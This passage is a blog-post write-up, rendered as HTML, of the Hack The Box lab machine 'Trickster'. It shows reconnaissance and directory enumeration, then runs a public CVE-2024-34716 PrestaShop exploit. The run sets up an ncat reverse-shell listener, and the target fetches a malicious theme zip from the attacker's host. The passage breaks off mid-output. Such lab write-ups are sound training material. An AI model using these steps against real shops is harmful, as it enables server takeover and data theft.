@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/01/31/hackthebox-trickster/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewTrickster is a medium-difficulty machine from Hack The Box dealing initially with CVE-2024-34716 which is a PrestaShop XSS to RCE exploit; later extracting some database creds to be able to ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Trickster">
+<meta property="og:url" content="http://fouedsaidi.com/2025/01/31/Hackthebox-Trickster/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewTrickster is a medium-difficulty machine from Hack The Box dealing initially with CVE-2024-34716 which is a PrestaShop XSS to RCE exploit; later extracting some database creds to be able to ex">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/Trickster.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/web1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/web2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/changedetection.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/changedetection1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/changedetection2.png">
+<meta property="article:published_time" content="2025-01-31T19:45:25.000Z">
+<meta property="article:modified_time" content="2025-02-01T10:27:12.578Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Trickster/Trickster.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Trickster -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Trickster</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-31 20:45:25</span>
+        <span class="mobile">2025-01-31 20:45:25</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-02-01 11:27:12</span>
+            <span class="mobile">2025-02-01 11:27:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Trickster is a medium-difficulty machine from Hack The Box dealing initially with CVE-2024-34716 which is a PrestaShop XSS to RCE exploit; later extracting some database creds to be able to exploit the internally deployed ChangeDetection instance through CVE-2024-32651 to land a root shell on the docker container. Then, we’ll extract some of the instance backups where we’ll find another user’s password which will lead us to exploiting a PrusaSlicer Arbitrary Code Execution to get root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/Trickster.png"
+                      alt="Trickster-info-card"
+                ><figcaption>Trickster-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">46.156</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span><span class="literal">-02-01</span> <span class="number">08</span>:<span class="number">31</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">46.156</span></span><br><span class="line">Host is up (<span class="number">0.11</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">8</span>c:<span class="number">01</span>:<span class="number">0</span>e:<span class="number">7</span>b:b4:da:b7:<span class="number">2</span>f:bb:<span class="number">2</span>f:d3:a3:<span class="number">8</span>c:a6:<span class="number">6</span>d:<span class="number">87</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">90</span>:c6:f3:d8:<span class="number">3</span>f:<span class="number">96</span>:<span class="number">99</span>:<span class="number">94</span>:<span class="number">69</span>:fe:d3:<span class="number">72</span>:cb:fe:<span class="number">6</span>c:c5 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">52</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://trickster.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">52</span> (Ubuntu)</span><br><span class="line">Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">33.44</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our casual ssh 22 port open alongside with a web app on port 80 that’s redirecting us to <code>trickster.htb</code>, so let’s go ahead and add that entry to our <code>/etc/hosts</code> file.</p>
+<h4 id="Ffuf-Subdomain-Enumeration"><a href="#Ffuf-Subdomain-Enumeration" class="headerlink" title="Ffuf - Subdomain Enumeration"></a>Ffuf - Subdomain Enumeration</h4><p>Looking more for some subdomains:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Tools\ffuf&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists\Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.trickster.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.46.156&quot;</span>  <span class="literal">-fc</span> <span class="number">301</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.147.84</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Tools\SecLists\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.trickster.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response status: 301</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shop                    [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 92ms] ::</span></span><br><span class="line"><span class="string">:: Progress: [383/100000] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:03] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we got a <code>shop</code> subdomain! Let’s add it to <code>/etc/hosts</code>.</p>
+<h4 id="Directory-Bruteforcing"><a href="#Directory-Bruteforcing" class="headerlink" title="Directory Bruteforcing"></a>Directory Bruteforcing</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Tools&gt; feroxbuster.exe <span class="literal">-u</span> http://shop.trickster.htb <span class="literal">-w</span> .\SecLists\Discovery\Web<span class="literal">-Content</span>\big.txt <span class="literal">-e</span></span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: <span class="number">2.8</span>.<span class="number">0</span></span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://shop.trickster.htb</span><br><span class="line"> 🚀  Threads               │ <span class="number">50</span></span><br><span class="line"> 📖  Wordlist              │ .\SecLists\Discovery\Web<span class="literal">-Content</span>\big.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ <span class="number">7</span></span><br><span class="line"> 🦡  User<span class="literal">-Agent</span>            │ feroxbuster/<span class="number">2.8</span>.<span class="number">0</span></span><br><span class="line"> 🔎  Extract Links         │ true</span><br><span class="line"> 🏁  HTTP methods          │ [<span class="type">GET</span>]</span><br><span class="line"> 🔃  Recursion Depth       │ <span class="number">4</span></span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [<span class="type">ENTER</span>] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line"><span class="number">403</span>      GET        <span class="number">9</span>l       <span class="number">28</span>w      <span class="number">283</span>c http://shop.trickster.htb/.htaccess</span><br><span class="line"><span class="number">403</span>      GET        <span class="number">9</span>l       <span class="number">28</span>w      <span class="number">283</span>c http://shop.trickster.htb/.bashrc</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">9</span>l       <span class="number">28</span>w      <span class="number">323</span>c http://shop.trickster.htb/.git =&gt; http://shop.trickster.htb/.git/</span><br></pre></td></tr></table></figure></div>
+
+<p>Doing some further enumeration, we find that the <code>.git</code> directory is exposed, we’ll look into this a bit later.</p>
+<h3 id="Web-Application-http-trickster-htb"><a href="#Web-Application-http-trickster-htb" class="headerlink" title="Web Application - http://trickster.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://trickster.htb/" >http://trickster.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/web.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure><br>Seems just like a casual web application with no apparent features, except for being redirected to <code>shop.trickster.htb</code> when clicking on <code>shop</code>.</p>
+<h3 id="Web-Application-http-shop-trickster-htb"><a href="#Web-Application-http-shop-trickster-htb" class="headerlink" title="Web Application - http://shop.trickster.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://shop.trickster.htb/" >http://shop.trickster.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/web1.png"
+                      alt="Shop Web App"
+                ><figcaption>Shop Web App</figcaption></figure></p>
+<p>This is a <a class="link"   target="_blank" rel="noopener" href="https://www.prestashop-project.org/" >Prestashop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> instance.</p>
+<p>Now in order for us to look at an exploit, we’ve got to uncover what the <code>.git</code> directory has hidden for us. You can download that directory using the <a class="link"   target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper" >Git-Dumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> tool.</p>
+<p>One interesting dumped directory was <code>admin634ewutrx1jgitlooaj</code>, we navigate to it on our browser and we get the version:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/web2.png"
+                      alt="Shop Web App"
+                ><figcaption>Shop Web App</figcaption></figure></p>
+<h4 id="CVE-2024-34716-XSS-to-RCE"><a href="#CVE-2024-34716-XSS-to-RCE" class="headerlink" title="CVE-2024-34716 - XSS to RCE"></a>CVE-2024-34716 - XSS to RCE</h4><p><a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-34716" >CVE-2024-34716 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> is a cross-site scripting (XSS) vulnerability that only affects PrestaShops with customer-thread feature flag enabled, a hacker can upload a malicious file containing an XSS that will be executed when an admin opens the attached file in back office. The script injected can access the session and the security token, which allows it to perform any authenticated action in the scope of the administrator’s right.</p>
+<p>I found <a class="link"   target="_blank" rel="noopener" href="https://github.com/aelmokhtar/CVE-2024-34716" >this amazing POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> when navigating the internet.</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\HackThebox\HTB_Machines\Trickster\CVE<span class="literal">-2024-34716-new</span>&gt; python3 .\exploit.py <span class="literal">--url</span> http://shop.trickster.htb <span class="literal">--email</span> kujen@kujen.htb <span class="literal">--local-ip</span> <span class="number">10.10</span>.x.x  <span class="literal">--admin-path</span> admin634ewutrx1jgitlooaj</span><br><span class="line">[<span class="type">X</span>] Starting exploit with:</span><br><span class="line">        Url: http://shop.trickster.htb</span><br><span class="line">        Email: kujen@kujen.htb</span><br><span class="line">        Local IP: <span class="number">10.10</span>.x.x</span><br><span class="line">        Admin Path: admin634ewutrx1jgitlooaj</span><br><span class="line">[<span class="type">X</span>] Ncat is now listening on port <span class="number">12345</span>. Press Ctrl+C to terminate.</span><br><span class="line">Serving at http.Server on port <span class="number">5000</span></span><br><span class="line">Ncat: Version <span class="number">7.95</span> ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on [::]:<span class="number">12345</span></span><br><span class="line">Ncat: Listening on <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">12345</span></span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">Request: GET /ps_next_8_theme_malicious.zip HTTP/<span class="number">1.1</span></span><br><span class="line">Response: <span class="number">200</span> -</span><br><span class="line"><span class="number">10.129</span>.<span class="number">46.156</span> - - [<span class="number">01</span>/<span class="type">Feb</span>/<span class="number">2025</span> <span class="number">09</span>:<span class="number">26</span>:<span class="number">50</span>] <span class="string">&quot;GET /ps_next_8_theme_malicious.zip HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">GET request to 